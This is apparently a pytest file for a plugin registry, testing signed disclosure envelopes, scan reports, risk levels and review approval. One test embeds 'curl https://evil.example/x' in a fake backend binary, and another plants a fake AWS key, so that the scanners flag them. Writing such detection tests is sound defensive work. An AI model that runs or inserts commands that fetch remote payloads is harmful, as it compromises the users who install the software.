"""D-a: the Registry computes and signs the disclosure (contract section 3.5).

The disclosure is computed from the published manifest with the contract
module, signed in a separate disclosure envelope by the same Registry signer,
and served beside the unchanged 8-field package envelope together with the
unsigned `registry` facts (section 3.4).
"""

from __future__ import annotations

import base64
import hashlib
import json
import re
import sqlite3
from pathlib import Path

import pytest
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey
from sqlmodel import Session, select

from registry.db import create_db_engine
from registry.manifest_v2 import ManifestV2
from registry.models import ExtensionVersion, Publisher
from registry.native_backend import MIN_NAVIDE_FOR_THIRD_PARTY_BACKEND
from registry.plugin_contract import disclosure_contract, disclosure_scan_contract
from registry.signing import canonical_json
from tests.conftest import SignedEnv
from tests.fixtures import build_package, build_v2_package, contract_manifest
from tests.phase2_helpers import (
    ADMIN_HEADERS,
    ADMIN_MEMBER,
    FakeDns,
    claim,
    cloud_settings,
    csrf_of,
    make_client,
    new_token,
    publish,
    queued_artifacts,
    sign_in,
)
from tests.test_migrations import PRE_DISCOVERY_SCHEMA, _create

REPO = Path(__file__).resolve().parents[3]
CONTRACT_FIXTURES = REPO / "docs" / "plugin-contracts" / "agent-tools-fixtures"
VENDORED = Path(__file__).resolve().parents[1] / "registry" / "plugin_contract"
BACKEND_CONTRACT = REPO / "backend" / "agent_team_backend" / "plugins"
MACHO_ARM64 = (0xFEEDFACF).to_bytes(4, "little") + (0x0100000C).to_bytes(4, "little")
AWS_KEY = b"AKIA" + b"A" * 16

PACKAGE_ENVELOPE_FIELDS = [
    "schemaVersion", "artifactDigest", "packageId", "version", "target",
    "publisherId", "keyId", "signedAt",
]
DISCLOSURE_ENVELOPE_FIELDS = list(disclosure_scan_contract.DISCLOSURE_ENVELOPE_FIELDS)


# -- the v0.2.24 App's package-envelope shape check, ported verbatim ---------
# Source: git show v0.2.24:src/main/plugins/pluginRegistryTrust.ts
# (assertRegistryPackageEnvelopeShape) and pluginTrustJson.ts
# (requireTrustObject, assertExactTrustFields). Every released App since
# v0.1.86 runs this on `registry_envelope`; a new Registry must still pass it.
_PLUGIN_ID_RE = re.compile(r"^[a-z0-9][a-z0-9-]*(\.[a-z0-9][a-z0-9-]*)+$")


def _v0_2_24_assert_registry_package_envelope_shape(value: object) -> None:
    label = "registry envelope"
    if not isinstance(value, dict):
        raise AssertionError(f"{label} must be an object")
    allowed = set(PACKAGE_ENVELOPE_FIELDS)
    for key in value:
        if key not in allowed:
            raise AssertionError(f"{label} contains unsupported field '{key}'")
    for key in PACKAGE_ENVELOPE_FIELDS:
        if key not in value:
            raise AssertionError(f"{label}.{key} is required")
    if value["schemaVersion"] != 1:
        raise AssertionError(f"{label} schemaVersion is unsupported")
    for key in PACKAGE_ENVELOPE_FIELDS[1:]:
        if not isinstance(value[key], str):
            raise AssertionError(f"{label}.{key} must be a string")
    if not _PLUGIN_ID_RE.fullmatch(value["packageId"]):
        raise AssertionError(f"{label}.packageId is invalid")


def _verify(public_key_pem: str, value: dict, signature: str) -> None:
    public_key = serialization.load_pem_public_key(public_key_pem.encode("ascii"))
    assert isinstance(public_key, Ed25519PublicKey)
    public_key.verify(base64.b64decode(signature), canonical_json(value))


def _digest(disclosure: dict) -> str:
    spelling = disclosure_contract.canonical_contract_json(disclosure)
    return hashlib.sha256(spelling.encode("ascii")).hexdigest()


def _publish_signed(env: SignedEnv, package: bytes, target: str = "universal"):
    return env.client.post(
        "/api/publish",
        params={"signature": env.sign(hashlib.sha256(package).hexdigest()), "target": target},
        files={"package": ("plugin.vsix", package, "application/zip")},
        headers={"Authorization": f"Bearer {env.token}"},
    )


def _v2_manifest(**overrides: object) -> dict:
    manifest = contract_manifest("fs-scopes-declared.json")
    manifest.update(id="acme.scoped", publisher="acme")
    manifest.update(overrides)
    return manifest


def _backend_manifest(identity: str = "acme.indexer", publisher: str = "acme") -> dict:
    manifest = contract_manifest("backend-declared-methods.json")
    manifest.update(id=identity, publisher=publisher)
    manifest["engines"] = {"navide": f">={MIN_NAVIDE_FOR_THIRD_PARTY_BACKEND}"}
    return manifest


# -- vendored contract -------------------------------------------------------


@pytest.mark.parametrize(
    "name", ["agent_tools_contract.py", "disclosure_contract.py", "disclosure_scan_contract.py"]
)
def test_vendored_contract_modules_are_byte_identical_to_the_backend(name: str) -> None:
    assert (VENDORED / name).read_bytes() == (BACKEND_CONTRACT / name).read_bytes()


def test_vendored_disclosure_matches_the_shared_fixtures() -> None:
    cases = json.loads((CONTRACT_FIXTURES / "disclosure-cases.json").read_text(encoding="utf-8"))
    for case in cases["cases"]:
        assert disclosure_contract.compute_disclosure(case["manifest"]) == case["expected"], case["name"]
    canonical = json.loads((CONTRACT_FIXTURES / "canonical.json").read_text(encoding="utf-8"))
    case = next(c for c in cases["cases"] if c["name"] == canonical["disclosureCase"])
    assert _digest(disclosure_contract.compute_disclosure(case["manifest"])) == canonical["disclosureDigestExpected"]


def test_the_stored_manifest_gives_the_same_disclosure_as_the_raw_one() -> None:
    # The Registry computes from the validated manifest it stores; the App
    # computes from the raw manifest.json. Both must spell the same disclosure.
    cases = json.loads((CONTRACT_FIXTURES / "disclosure-cases.json").read_text(encoding="utf-8"))
    checked = 0
    for case in cases["cases"]:
        try:
            parsed = ManifestV2.model_validate(case["manifest"])
        except ValueError:
            continue  # declares something this Registry does not accept yet (agentTools)
        stored = parsed.model_dump(exclude_none=True)
        assert disclosure_contract.compute_disclosure(stored) == case["expected"], case["name"]
        checked += 1
    for name in ("fs-scopes-declared.json", "backend-declared-methods.json", "frontend-ai-cli.json"):
        raw = contract_manifest(name)
        stored = ManifestV2.model_validate(raw).model_dump(exclude_none=True)
        assert disclosure_contract.canonical_contract_json(
            disclosure_contract.compute_disclosure(stored)
        ) == disclosure_contract.canonical_contract_json(disclosure_contract.compute_disclosure(raw))
        checked += 1
    assert checked >= 5


# -- publish without review --------------------------------------------------


def test_publish_signs_a_disclosure_envelope_beside_the_unchanged_package_envelope(
    signed_env: SignedEnv,
) -> None:
    manifest = _v2_manifest()
    assert _publish_signed(signed_env, build_v2_package(manifest)).status_code == 201

    version = signed_env.client.get("/api/extensions/acme/scoped").json()["versions"][0]
    envelope = version["registry_envelope"]
    _v0_2_24_assert_registry_package_envelope_shape(envelope)
    assert set(envelope) == set(PACKAGE_ENVELOPE_FIELDS)
    _verify(signed_env.registry_signer_public_pem, envelope, version["registry_signature"])

    disclosure = version["disclosure"]
    assert disclosure == disclosure_contract.compute_disclosure(manifest)
    assert disclosure["plugin"] == {"id": "acme.scoped", "version": manifest["version"], "publisher": "acme"}

    attestation = version["disclosure_envelope"]
    assert sorted(attestation) == sorted(DISCLOSURE_ENVELOPE_FIELDS)
    assert attestation["schemaVersion"] == 1
    for field in ("artifactDigest", "packageId", "version", "target", "keyId", "signedAt"):
        assert attestation[field] == envelope[field], field
    assert attestation["disclosureDigest"] == _digest(disclosure)
    assert re.fullmatch(r"[0-9a-f]{64}", attestation["disclosureDigest"])
    # The frontend scan report is signed through scanDigest (contract 3.8).
    assert len(DISCLOSURE_ENVELOPE_FIELDS) == 9
    assert version["scan"]["artifactDigest"] == envelope["artifactDigest"]
    assert attestation["scanDigest"] == hashlib.sha256(
        disclosure_contract.canonical_contract_json(version["scan"]).encode("ascii")
    ).hexdigest()
    _verify(signed_env.registry_signer_public_pem, attestation, version["disclosure_signature"])


def test_a_tampered_disclosure_no_longer_matches_its_signed_digest(signed_env: SignedEnv) -> None:
    assert _publish_signed(signed_env, build_v2_package(_v2_manifest())).status_code == 201
    version = signed_env.client.get("/api/extensions/acme/scoped").json()["versions"][0]
    tampered = json.loads(json.dumps(version["disclosure"]))
    tampered["permissions"]["system"] = ["ui"]
    assert _digest(tampered) != version["disclosure_envelope"]["disclosureDigest"]
    forged = dict(version["disclosure_envelope"], disclosureDigest=_digest(tampered))
    with pytest.raises(Exception):
        _verify(signed_env.registry_signer_public_pem, forged, version["disclosure_signature"])


def test_auto_published_registry_facts(signed_env: SignedEnv) -> None:
    assert _publish_signed(signed_env, build_v2_package(_v2_manifest())).status_code == 201
    version = signed_env.client.get("/api/extensions/acme/scoped").json()["versions"][0]
    assert version["registry"] == {
        "publisher": {"name": "Acme", "verifiedDomain": None, "domainVerifiedAt": None},
        "signature": {"signed": True, "keyId": "registry-2026-01"},
        "review": {"status": "not-required", "reviewedAt": None, "nativeCodeInspected": None},
        "scan": {"secretScan": "not-run", "secretFindings": 0, "similarityWarning": False,
                 "similarTo": None, "scannedAt": None},
    }


def test_auto_published_native_backend_is_not_inspected(signed_env: SignedEnv) -> None:
    package = build_v2_package(_backend_manifest(), backend_data=MACHO_ARM64)
    assert _publish_signed(signed_env, package, target="darwin-arm64").status_code == 201
    version = signed_env.client.get("/api/extensions/acme/indexer").json()["versions"][0]
    assert version["registry"]["review"] == {
        "status": "not-required", "reviewedAt": None, "nativeCodeInspected": False,
    }
    assert version["disclosure"]["nativeBackend"] is not None
    assert version["disclosure_envelope"]["target"] == "darwin-arm64"
    # The native executable is scanned and the report signed (contract 3.8).
    assert version["scan"]["native"][0]["format"] == "mach-o"
    assert version["disclosure_envelope"]["scanDigest"] is not None


def test_the_listing_carries_the_latest_versions_disclosure_and_scan(signed_env: SignedEnv) -> None:
    # Plan B D1 (review L4 on #360): the list card shows the summary and the
    # risk level, which needs the manifest disclosure and the scan report.
    assert _publish_signed(signed_env, build_v2_package(_v2_manifest())).status_code == 201
    version = signed_env.client.get("/api/extensions/acme/scoped").json()["versions"][0]
    [item] = signed_env.client.get("/api/extensions").json()["items"]
    assert item["disclosure"] == version["disclosure"] is not None
    assert item["scan"] == version["scan"] is not None
    # Display data only: no envelope or signature travels in the listing.
    assert "disclosure_envelope" not in item and "disclosure_signature" not in item


def test_the_listing_carries_each_targets_risk_level(signed_env: SignedEnv) -> None:
    # D-f: the list card shows the highest level any platform's artifact has,
    # so it never reads lower than what some platform installs.
    manifest = _backend_manifest()
    plain = build_v2_package(manifest, backend_data=MACHO_ARM64)
    curl = build_v2_package(manifest, backend_data=ELF_X64 + b"\0curl https://evil.example/x\0")
    assert _publish_signed(signed_env, plain, target="darwin-arm64").status_code == 201
    assert _publish_signed(signed_env, curl, target="linux-x64").status_code == 201
    versions = signed_env.client.get("/api/extensions/acme/indexer").json()["versions"]
    expected = {
        row["target"]: disclosure_scan_contract.card_risk_level(row["disclosure"], row["scan"]) for row in versions
    }
    assert len(set(expected.values())) == 2
    [item] = signed_env.client.get("/api/extensions").json()["items"]
    assert item["risk_by_target"] == expected


def test_a_legacy_v1_package_has_no_disclosure(signed_env: SignedEnv) -> None:
    assert _publish_signed(signed_env, build_package()).status_code == 201
    version = signed_env.client.get("/api/extensions/acme/hello").json()["versions"][0]
    _v0_2_24_assert_registry_package_envelope_shape(version["registry_envelope"])
    assert version["disclosure"] is None
    assert version["disclosure_envelope"] is None
    assert version["disclosure_signature"] is None
    assert version["scan"] is None
    assert version["registry"]["review"]["status"] == "not-required"


def test_a_version_published_before_disclosure_still_lists_with_null_fields(
    signed_env: SignedEnv,
) -> None:
    assert _publish_signed(signed_env, build_v2_package(_v2_manifest())).status_code == 201
    with Session(signed_env.client.app.state.registry.engine) as session:
        row = session.exec(select(ExtensionVersion)).one()
        envelope, signature = dict(row.registry_envelope), row.registry_signature
        row.disclosure = None
        row.disclosure_envelope = None
        row.disclosure_signature = None
        session.add(row)
        session.commit()

    listing = signed_env.client.get("/api/extensions").json()
    assert [item["identity"] for item in listing["items"]] == ["acme.scoped"]
    assert listing["items"][0]["disclosure"] is None
    assert listing["items"][0]["risk_by_target"] is None
    version = signed_env.client.get("/api/extensions/acme/scoped").json()["versions"][0]
    assert version["registry_envelope"] == envelope
    assert version["registry_signature"] == signature
    _v0_2_24_assert_registry_package_envelope_shape(version["registry_envelope"])
    _verify(signed_env.registry_signer_public_pem, version["registry_envelope"], version["registry_signature"])
    assert (version["disclosure"], version["disclosure_envelope"], version["disclosure_signature"]) == (None, None, None)
    assert version["registry"] is not None


# -- review-required namespace -----------------------------------------------


@pytest.fixture()
def dns():
    return FakeDns()


@pytest.fixture()
def cloud(tmp_path, dns):
    client = make_client(cloud_settings(tmp_path), dns)
    sign_in(client)
    assert claim(client, "acme-tools").status_code == 303
    return client


def _verify_domain(client, dns: FakeDns) -> None:
    csrf = csrf_of(client, "/publisher/acme-tools")
    client.post("/publisher/acme-tools/domain", data={"domain": "acme.example", "csrf": csrf})
    html = client.get("/publisher/acme-tools").text
    token = html.split("navide-verify=")[1].split("\n")[0].split("<")[0].strip()
    from registry.dns_verify import record_host, record_value

    dns.records[record_host("acme.example")] = [f'"{record_value(token)}"']
    check = client.post("/publisher/acme-tools/domain/check", data={"csrf": csrf_of(client, "/publisher/acme-tools")})
    assert check.status_code == 303


def test_review_approval_signs_the_disclosure_and_reports_inspection(cloud, dns) -> None:
    token = new_token(cloud, "acme-tools")
    with Session(cloud.app.state.registry.engine) as session:
        publisher = session.exec(select(Publisher).where(Publisher.name == "acme-tools")).one()
        publisher.native_backend_allowed = True
        session.add(publisher)
        session.commit()
    _verify_domain(cloud, dns)
    manifest = _backend_manifest("acme-tools.indexer", "acme-tools")
    package = build_v2_package(manifest, backend_data=MACHO_ARM64)
    assert publish(cloud, token, package, target="darwin-arm64").status_code == 201

    with Session(cloud.app.state.registry.engine) as session:
        pending = session.exec(select(ExtensionVersion)).one()
        assert pending.disclosure_envelope is None and pending.disclosure_signature is None

    artifacts = queued_artifacts(cloud, "acme-tools", "indexer")
    sign_in(cloud, member_id=ADMIN_MEMBER, name="Admin")
    approved = cloud.post(
        "/admin/review/acme-tools/indexer/1.0.0/approve",
        data={"csrf": csrf_of(cloud, "/admin/review"), "artifact": artifacts, "inspected_backend": "yes"},
    )
    assert approved.status_code == 303, approved.text

    detail = cloud.get("/api/extensions/acme-tools/indexer").json()
    version = detail["versions"][0]
    _v0_2_24_assert_registry_package_envelope_shape(version["registry_envelope"])
    signer_key = detail["trust_metadata"]["signers"][0]["publicKey"]
    _verify(signer_key, version["registry_envelope"], version["registry_signature"])
    _verify(signer_key, version["disclosure_envelope"], version["disclosure_signature"])
    assert version["disclosure"] == disclosure_contract.compute_disclosure(manifest)
    assert version["disclosure_envelope"]["disclosureDigest"] == _digest(version["disclosure"])
    assert version["disclosure_envelope"]["signedAt"] == version["registry_envelope"]["signedAt"]

    facts = version["registry"]
    assert facts["publisher"]["verifiedDomain"] == "acme.example"
    assert facts["publisher"]["domainVerifiedAt"] is not None
    assert facts["review"]["status"] == "approved"
    assert facts["review"]["reviewedAt"] is not None
    assert facts["review"]["nativeCodeInspected"] is True
    assert facts["scan"]["secretScan"] == "clean"
    assert facts["scan"]["secretFindings"] == 0
    assert facts["scan"]["scannedAt"] is not None


def test_scan_summary_has_counts_only_never_values_or_paths(cloud) -> None:
    token = new_token(cloud, "acme-tools")
    manifest = contract_manifest()
    manifest.update(id="acme-tools.viewer", publisher="acme-tools")
    package = build_v2_package(manifest, extra_files={"assets/leak.txt": b"key=" + AWS_KEY})
    assert publish(cloud, token, package).status_code == 201
    artifacts = queued_artifacts(cloud, "acme-tools", "viewer")
    approved = cloud.post(
        "/api/admin/review/acme-tools/viewer/1.0.0/approve",
        json={"artifacts": artifacts, "acknowledge_secret_findings": True},
        headers=ADMIN_HEADERS,
    )
    assert approved.status_code == 200, approved.text

    version = cloud.get("/api/extensions/acme-tools/viewer").json()["versions"][0]
    scan = version["registry"]["scan"]
    assert scan["secretScan"] == "findings"
    assert scan["secretFindings"] == 1
    assert version["registry"]["review"]["nativeCodeInspected"] is None
    # Approval rescans the stored package and signs that report.
    assert version["scan"] is not None
    assert version["disclosure_envelope"]["scanDigest"] == hashlib.sha256(
        disclosure_contract.canonical_contract_json(version["scan"]).encode("ascii")
    ).hexdigest()
    assert "AKIA" not in json.dumps(version["scan"])
    wire = json.dumps(version["registry"])
    assert "AKIA" not in wire
    assert "leak.txt" not in wire
    assert "rule" not in wire


# -- migration ---------------------------------------------------------------


def test_migration_adds_nullable_disclosure_columns(tmp_path) -> None:
    path = tmp_path / "registry.db"
    _create(path, PRE_DISCOVERY_SCHEMA)
    create_db_engine(path)
    with sqlite3.connect(path) as db:
        columns = {row[1] for row in db.execute("PRAGMA table_info(extension_version)")}
        applied = {row[1] for row in db.execute("SELECT version, name FROM schema_migrations")}
    assert {"disclosure", "disclosure_envelope", "disclosure_signature", "scan"} <= columns
    assert "version-disclosure" in applied


def test_a_scan_report_is_signed_through_its_own_digest(signed_env: SignedEnv) -> None:
    from registry.disclosure import sign_disclosure

    signer = signed_env.client.app.state.registry.trust_signer
    manifest = _v2_manifest()
    package_envelope, _ = signer.sign_envelope(
        artifact_digest="b" * 64, package_id="acme.scoped", version=manifest["version"],
        target="universal", publisher_id="acme",
    )
    fixture = json.loads((CONTRACT_FIXTURES / "scan-cases.json").read_text(encoding="utf-8"))
    report = next(c["scan"] for c in fixture["cases"] if c["name"] == fixture["scanDigestCase"])
    report = dict(report, artifactDigest="b" * 64, target="universal")
    disclosure, envelope, signature = sign_disclosure(signer, manifest, package_envelope, report)
    expected = hashlib.sha256(disclosure_contract.canonical_contract_json(report).encode("ascii")).hexdigest()
    assert envelope["scanDigest"] == expected
    assert envelope["disclosureDigest"] == _digest(disclosure)
    _verify(signed_env.registry_signer_public_pem, envelope, signature)
    with pytest.raises(ValueError):
        sign_disclosure(signer, manifest, package_envelope, dict(report, artifactDigest="c" * 64))


# -- review findings on #353 -------------------------------------------------

ELF_X64 = b"\x7fELF\x02\x01\x01" + b"\0" * 9 + (2).to_bytes(2, "little") + (62).to_bytes(2, "little") + b"\0" * 44


def test_approving_two_targets_signs_one_disclosure_envelope_per_artifact(cloud, dns) -> None:
    token = new_token(cloud, "acme-tools")
    with Session(cloud.app.state.registry.engine) as session:
        publisher = session.exec(select(Publisher).where(Publisher.name == "acme-tools")).one()
        publisher.native_backend_allowed = True
        session.add(publisher)
        session.commit()
    _verify_domain(cloud, dns)
    manifest = _backend_manifest("acme-tools.indexer", "acme-tools")
    for target, binary in (("darwin-arm64", MACHO_ARM64), ("linux-x64", ELF_X64)):
        response = publish(cloud, token, build_v2_package(manifest, backend_data=binary), target=target)
        assert response.status_code == 201, response.text
    artifacts = queued_artifacts(cloud, "acme-tools", "indexer")
    assert len(artifacts) == 2
    sign_in(cloud, member_id=ADMIN_MEMBER, name="Admin")
    approved = cloud.post(
        "/admin/review/acme-tools/indexer/1.0.0/approve",
        data={"csrf": csrf_of(cloud, "/admin/review"), "artifact": artifacts, "inspected_backend": "yes"},
    )
    assert approved.status_code == 303, approved.text

    detail = cloud.get("/api/extensions/acme-tools/indexer").json()
    signer_key = detail["trust_metadata"]["signers"][0]["publicKey"]
    rows = sorted(detail["versions"], key=lambda row: row["target"])
    assert [row["target"] for row in rows] == ["darwin-arm64", "linux-x64"]
    for row in rows:
        envelope = row["disclosure_envelope"]
        for field in ("artifactDigest", "packageId", "version", "target", "keyId", "signedAt"):
            assert envelope[field] == row["registry_envelope"][field], (row["target"], field)
        assert envelope["artifactDigest"] == row["package_digest"]
        _verify(signer_key, envelope, row["disclosure_signature"])
    assert rows[0]["disclosure_envelope"]["artifactDigest"] != rows[1]["disclosure_envelope"]["artifactDigest"]


def test_a_disclosure_envelope_fails_the_v0_2_24_package_envelope_check(signed_env: SignedEnv) -> None:
    # No shared context string separates the two signed objects; their exact
    # field sets do (contract 3.5), so neither can stand in for the other.
    assert _publish_signed(signed_env, build_v2_package(_v2_manifest())).status_code == 201
    version = signed_env.client.get("/api/extensions/acme/scoped").json()["versions"][0]
    with pytest.raises(AssertionError, match="unsupported field 'disclosureDigest'"):
        _v0_2_24_assert_registry_package_envelope_shape(version["disclosure_envelope"])
    assert set(version["registry_envelope"]) != set(version["disclosure_envelope"])


@pytest.mark.parametrize("status", ["expired", "revoked"])
def test_the_disclosure_signer_checks_its_own_status(signed_env: SignedEnv, status: str) -> None:
    from dataclasses import replace as dataclass_replace

    signer = signed_env.client.app.state.registry.trust_signer
    package_envelope, _ = signer.sign_envelope(
        artifact_digest="b" * 64, package_id="acme.scoped", version="1.0.0", target="universal", publisher_id="acme",
    )
    stale = dataclass_replace(signer, status=status)
    with pytest.raises(ValueError, match=status):
        stale.sign_disclosure_envelope(package_envelope=package_envelope, disclosure_digest="c" * 64)


def test_the_disclosure_signer_checks_its_own_validity_window(signed_env: SignedEnv) -> None:
    from datetime import timedelta

    signer = signed_env.client.app.state.registry.trust_signer
    package_envelope, _ = signer.sign_envelope(
        artifact_digest="b" * 64, package_id="acme.scoped", version="1.0.0", target="universal", publisher_id="acme",
    )
    with pytest.raises(ValueError, match="validity"):
        signer.sign_disclosure_envelope(
            package_envelope=package_envelope, disclosure_digest="c" * 64,
            now=signer.not_after + timedelta(days=1),
        )
